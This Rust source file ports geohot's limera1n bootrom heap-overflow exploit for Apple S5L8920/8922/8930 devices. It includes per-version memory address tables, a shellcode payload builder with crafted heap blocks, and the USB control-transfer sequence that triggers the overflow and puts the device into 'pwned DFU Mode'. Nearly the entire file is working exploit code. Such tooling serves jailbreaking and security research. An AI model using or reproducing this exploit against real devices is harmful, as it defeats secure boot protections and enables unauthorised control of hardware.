//! Port of `limera1n.py`: the heap overflow that pwns S5L8920/8922/8930 devices.
//! Credit: geohot.

use std::thread::sleep;
use std::time::Duration;

use crate::dfu;
use crate::libusb;
use crate::shellcode::{self, Arch};
use crate::utilities::die;

const CONSTANTS_359_3: &[u32] = &[
    0x8403_1800, //  1 - RELOCATE_SHELLCODE_ADDRESS
    1024,        //  2 - RELOCATE_SHELLCODE_SIZE
    0x83d4,      //  3 - memmove
    0x8403_4000, //  4 - MAIN_STACK_ADDRESS
    0x43c9,      //  5 - nor_power_on
    0x5ded,      //  6 - nor_init
    0x8402_4820, //  7 - gUSBSerialNumber
    0x8e7d,      //  8 - strlcat
    0x349d,      //  9 - usb_wait_for_image
    0x8400_0000, // 10 - LOAD_ADDRESS
    0x24000,     // 11 - MAX_SIZE
    0x8402_4228, // 12 - gLeakingDFUBuffer
    0x1ccd,      // 13 - free
    0x6578_6563, // 14 - EXEC_MAGIC
    0x1f79,      // 15 - memz_create
    0x3969,      // 16 - jump_to
    0x1fa1,      // 17 - memz_destroy
    0x60,        // 18 - IMAGE3_LOAD_SP_OFFSET
    0x50,        // 19 - IMAGE3_LOAD_STRUCT_OFFSET
    0x1fe5,      // 20 - image3_create_struct
    0x2655,      // 21 - image3_load_continue
    0x277b,      // 22 - image3_load_fail
];

const CONSTANTS_359_3_2: &[u32] = &[
    0x8403_1800,
    1024,
    0x83dc,
    0x8403_4000,
    0x43d1,
    0x5df5,
    0x8402_4820,
    0x8e85,
    0x34a5,
    0x8400_0000,
    0x24000,
    0x8402_4228,
    0x1ccd,
    0x6578_6563,
    0x1f81,
    0x3971,
    0x1fa9,
    0x60,
    0x50,
    0x1fed,
    0x265d,
    0x2783,
];

const CONSTANTS_359_5: &[u32] = &[
    0x8403_1800,
    1024,
    0x8564,
    0x8403_4000,
    0x43b9,
    0x5f75,
    0x8402_4750,
    0x901d,
    0x36e5,
    0x8400_0000,
    0x24000,
    0x8402_4158,
    0x1a51,
    0x6578_6563,
    0x1f25,
    0x39dd,
    0x1f0d,
    0x64,
    0x60,
    0x2113,
    0x2665,
    0x276d,
];

const CONSTANTS_574_4: &[u32] = &[
    0x8403_9800,
    1024,
    0x84dc,
    0x8403_c000,
    0x4e8d,
    0x690d,
    0x8402_e0e0,
    0x90c9,
    0x4c85,
    0x8400_0000,
    0x2c000,
    0x8402_dbcc,
    0x3b95,
    0x6578_6563,
    0x7469,
    0x5a5d,
    0x7451,
    0x68,
    0x64,
    0x412d,
    0x46db,
    0x47db,
];

struct DeviceConfig {
    version: &'static str,
    cpid: &'static str,
    exploit_lr: u32,
    constants: &'static [u32],
}

static CONFIGS: &[DeviceConfig] = &[
    // S5L8920 (old bootrom)
    DeviceConfig {
        version: "359.3",
        cpid: "8920",
        exploit_lr: 0x8403_3FA4,
        constants: CONSTANTS_359_3,
    },
    // S5L8920 (new bootrom)
    DeviceConfig {
        version: "359.3.2",
        cpid: "8920",
        exploit_lr: 0x8403_3FA4,
        constants: CONSTANTS_359_3_2,
    },
    // S5L8922
    DeviceConfig {
        version: "359.5",
        cpid: "8922",
        exploit_lr: 0x8403_3F98,
        constants: CONSTANTS_359_5,
    },
    // S5L8930
    DeviceConfig {
        version: "574.4",
        cpid: "8930",
        exploit_lr: 0x8403_BF9C,
        constants: CONSTANTS_574_4,
    },
];

/// `limera1n.generate_payload`
fn generate_payload(constants: &[u32], exploit_lr: u32) -> Vec<u8> {
    let widened: Vec<u64> = constants.iter().map(|c| *c as u64).collect();
    let patched = shellcode::prepare_shellcode(shellcode::LIMERA1N, Arch::Armv7, &widened);

    let shellcode_address: u32 = 0x8400_0400 + 1;
    let mut heap_block = Vec::new();
    for value in [0x405u32, 0x101, shellcode_address, exploit_lr] {
        heap_block.extend_from_slice(&value.to_le_bytes());
    }
    heap_block.extend_from_slice(&[0xCCu8; 48]);

    let mut payload = heap_block.repeat(16);
    payload.extend_from_slice(&patched);
    payload
}

/// `limera1n_libusb1_async_ctrl_transfer`
fn async_ctrl_transfer(device: &crate::libusb::Device, timeout: f64) {
    libusb::async_ctrl_transfer(device, 0x21, 1, 0, 0, &[b'A'; 0x800], timeout);
}

/// `limera1n.exploit`
pub fn exploit() {
    println!("*** based on limera1n exploit (heap overflow) by geohot ***");

    let device = dfu::acquire_device();
    println!("Found: {}", device.serial_number);
    let serial_number = device.serial_number.clone();

    if serial_number.contains("PWND:[") {
        println!("Device is already in pwned DFU Mode. Not executing exploit.");
        return;
    }

    let chosen = CONFIGS
        .iter()
        .find(|config| serial_number.contains(&format!("SRTG:[iBoot-{}]", config.version)));

    let chosen = match chosen {
        Some(config) => config,
        None => {
            for config in CONFIGS {
                if serial_number.contains(&format!("CPID:{}", config.cpid)) {
                    println!("ERROR: CPID is compatible, but serial number string does not match.");
                    println!("Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.");
                    std::process::exit(1);
                }
            }
            die("ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting.");
        }
    };

    dfu::send_data(
        &device,
        &generate_payload(chosen.constants, chosen.exploit_lr),
    );

    let status = libusb::ctrl_in(&device, 0xA1, 1, 0, 0, 1, 1000);
    assert!(
        matches!(&status, Ok(v) if v.len() == 1),
        "limera1n: expected a 1 byte status response"
    );

    async_ctrl_transfer(&device, 10.0);

    // This request should fail; succeeding means the device was not overflowed.
    let rc = libusb::ctrl_out(&device, 0x21, 2, 0, 0, &[], 10);
    if rc >= 0 {
        println!("ERROR: This request succeeded, but it should have raised an exception. Exiting.");
        std::process::exit(1);
    }

    dfu::usb_reset(&device);
    drop(device);

    let device = dfu::acquire_device();
    dfu::request_image_validation(&device);
    drop(device);

    sleep(Duration::from_millis(500));

    let device = dfu::acquire_device();
    let failed = !device.serial_number.contains("PWND:[limera1n]");
    drop(device);

    if failed {
        die("ERROR: Exploit failed. Device did not enter pwned DFU Mode.");
    }

    println!("Device is now in pwned DFU Mode.");
}
